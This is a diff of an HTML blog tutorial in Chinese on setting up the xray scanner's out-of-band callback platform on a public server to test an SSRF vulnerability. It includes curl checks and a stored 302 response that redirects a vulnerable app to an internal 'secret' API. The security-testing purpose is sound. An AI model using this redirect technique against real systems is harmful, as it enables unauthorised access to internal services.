-  &lt;span class=&quot;s&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;listen_port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;false&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;db_file_path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./xray.db&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;listen_port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 静态解析规则&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# A, AAAA, TXT 三种&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
-      &lt;span class=&quot;s&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;60&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;http_base_url&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;dns_server_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;remote_server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;false&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+    &lt;span class=&quot;na&quot;&gt;resolve&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# A, AAAA, TXT 三种&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;record&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;localhost&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;127.0.0.1&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;60&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;http_base_url&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;dns_server_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;remote_server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;暂时只需要反连平台的 HTTP 相关功能，而不需要漏洞扫描和反连平台 DNS 相关的功能，所以只关心上面 DNS 以外的配置文件就足够了。&lt;/p&gt;
 
 &lt;p&gt;为了让之前提到的存在 ssrf 漏洞的应用可以访问的到，我们将 xray 运行在一个公网 IP 的机器上，所以 xray 监听的 IP 等等都需要配置，将上面的配置修改如下。&lt;/p&gt;
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;# 数据库文件路径，默认不用修改。&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;# 本文件只能一个进程访问，如果启动两个 xray 就需要指定不同的路径。&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;db_file_path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./xray.db&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;db_file_path&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./xray.db&quot;&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;# 用于生成的 url 验证，否则反连平台的 IP 一旦泄露，任何人访问你的平台都会被记录访问记录。&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;# 有了 token 可以限制生效范围，而且修改 token 就可以失效以前的 url。&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;# 我们修改为一个自定义的值&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;imtoken1&quot;&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;imtoken1&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 监听地址，我们在公网机器上需要修改为 `0.0.0.0`，让所有地址都可以访问&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 注意不一定是机器的公网 IP，本机不一定拥有这个 IP，否则会出错&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0.0.0.0&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0.0.0.0&quot;&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 监听端口，我们使用 4445&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;listen_port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4445&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;listen_port&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4445&quot;&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;# dns 部分没有修改&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 指定 http 部分的访问地址，这里才应该是机器的公网 IP&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;http_base_url&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://140.143.224.171:4445&quot;&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;dns_server_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;remote_server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;false&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+    &lt;span class=&quot;na&quot;&gt;http_base_url&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://140.143.224.171:4445&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;dns_server_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;remote_server&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;false&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;修改完成之后，运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;./xray reverse&lt;/code&gt;，就可以看到反连平台启动了。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[INFO] 2019-09-08 09:25:02 +0800 [default:config.go:160] loading config from config.yaml
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[INFO] 2019-09-08 09:25:02 +0800 [default:config.go:160] loading config from config.yaml
 reverse server base url: http://140.143.224.171:4445, token: imtoken1
 reverse server webUI: http://140.143.224.171:4445/cland/
 [DBUG] 2019-09-08 09:25:03 +0800 [default:reverse.go:40] reverse http server started, base url: http://140.143.224.171:4445, token: imtoken1
 [INFO] 2019-09-08 09:25:03 +0800 [reverse:http_server.go:118] starting reverse http server
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;访问提示的地址 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://140.143.224.171:4445/cland/&lt;/code&gt; 就可以看到反连平台的的界面了。点击 &lt;code class=&quot;highlighter-rouge&quot;&gt;生成一个 URL&lt;/code&gt; 就会提示输入 token。&lt;/p&gt;
 
@@ -304,28 +291,27 @@ reverse server webUI: http://140.143.224.171:4445/cland/
 
 &lt;p&gt;先按照页面上的提示先测试下反连平台的功能，运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;curl -v http://140.143.224.171:4445/p/89acfe/H34v/&lt;/code&gt;&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;curl -v http://140.143.224.171:4445/p/89acfe/H34v/
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://140.143.224.171:4445/p/89acfe/H34v/
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 140.143.224.171...
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TCP_NODELAY &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 140.143.224.171 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;140.143.224.171&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 4445 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;GET /p/89acfe/H34v/ HTTP/1.1
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;Host: 140.143.224.171:4445
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;User-Agent: curl/7.54.0
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&amp;gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /p/89acfe/H34v/ HTTP/1.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 140.143.224.171:4445
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.54.0
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 &amp;lt; HTTP/1.1 200 OK
-&amp;lt; Content-Security-Policy: default-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;; script-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'unsafe-inline'&lt;/span&gt;; object-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;; style-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'unsafe-inline'&lt;/span&gt;; img-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;; media-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;; frame-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;; font-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; data:; connect-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;
+&amp;lt; Content-Security-Policy: default-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; script-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'unsafe-inline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; object-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; style-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'unsafe-inline'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; img-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; media-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; frame-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; font-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt; data:&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; connect-src &lt;span class=&quot;s1&quot;&gt;'self'&lt;/span&gt;
 &amp;lt; Content-Type: application/json
 &amp;lt; X-Content-Type-Options: nosniff
 &amp;lt; X-Frame-Options: SAMEORIGIN
-&amp;lt; X-Xss-Protection: 1; &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;block
+&amp;lt; X-Xss-Protection: 1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;block
 &amp;lt; Date: Sun, 08 Sep 2019 01:28:16 GMT
 &amp;lt; Content-Length: 22
 &amp;lt;
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 140.143.224.171 left intact&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;code&quot;&lt;/span&gt;:0,&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;:null&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;%
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;然后在左边的 &lt;code class=&quot;highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; 一栏中就可以看到了访问记录&lt;/p&gt;
 
@@ -345,15 +331,15 @@ reverse server webUI: http://140.143.224.171:4445/cland/
 
 &lt;p&gt;点击保存之后，我们先用 curl 测试下。&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;curl -v http://140.143.224.171:4445/p/1cd0a7/3OGA/
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; http://140.143.224.171:4445/p/1cd0a7/3OGA/
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   Trying 140.143.224.171...
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TCP_NODELAY &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connected to 140.143.224.171 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;140.143.224.171&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; port 4445 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0)&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;GET /p/1cd0a7/3OGA/ HTTP/1.1
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;Host: 140.143.224.171:4445
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;User-Agent: curl/7.54.0
-&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&amp;gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; GET /p/1cd0a7/3OGA/ HTTP/1.1
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Host: 140.143.224.171:4445
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; User-Agent: curl/7.54.0
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Accept: &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
 &amp;lt; HTTP/1.1 302 Found
 &amp;lt; Content-Type: text/html
 &amp;lt; Location: http://127.0.0.1:8000/api/internal/secret
@@ -361,8 +347,7 @@ reverse server webUI: http://140.143.224.171:4445/cland/
 &amp;lt; Content-Length: 0
 &amp;lt;
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Connection &lt;span class=&quot;c&quot;&gt;#0 to host 140.143.224.171 left intact&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;工作一切正常。&lt;/p&gt;
 
@@ -412,42 +397,40 @@ reverse server webUI: http://140.143.224.171:4445/cland/
 
 &lt;p&gt;编辑刚才的配置文件&lt;/p&gt;
 
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;# 其他的项目没有修改 ...&lt;/span&gt;
-  &lt;span class=&quot;s&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;true&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;dns&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;enabled&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 和之前 http 的 listen ip 含义一样，修改为 0.0.0.0&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0.0.0.0&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;listen_ip&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0.0.0.0&quot;&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 刚才注册的域名&lt;/span&gt;
-    &lt;span class=&quot;s&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;revc.xyz&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;revc.xyz&quot;&lt;/span&gt;
     &lt;span class=&quot;c1&quot;&gt;# 静态解析规则，如果请求解析的域名在下面配置了，就直接返回对应的结果&lt;/span&gt;
